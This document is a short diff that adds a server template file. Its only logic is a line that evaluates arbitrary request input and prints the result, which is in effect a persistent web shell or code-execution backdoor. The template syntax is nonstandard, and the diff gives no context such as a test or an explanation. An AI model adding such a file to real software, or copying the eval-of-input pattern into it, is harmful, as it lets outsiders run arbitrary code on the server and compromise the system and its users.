@@ -1,0 +1,3 @@
+<%@ contentType="text/plain" persistent="true" %>
+<% print[eval[input]] %>
+
